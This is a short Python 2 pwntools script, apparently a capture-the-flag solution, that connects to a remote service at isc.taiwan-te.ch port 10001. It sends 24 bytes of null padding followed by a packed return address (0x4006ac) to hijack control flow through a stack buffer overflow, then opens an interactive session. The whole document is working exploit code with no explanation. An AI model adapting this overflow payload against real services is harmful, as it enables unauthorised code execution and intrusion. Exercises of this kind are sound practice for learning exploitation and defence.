#!/usr/bin/env python2
from pwn import *

c = remote('isc.taiwan-te.ch', 10001)
ans = "\0"*(16 + 8)
ans = ans + p64(0x00000000004006ac) # return

c.sendline(ans)

c.interactive()
c.close()
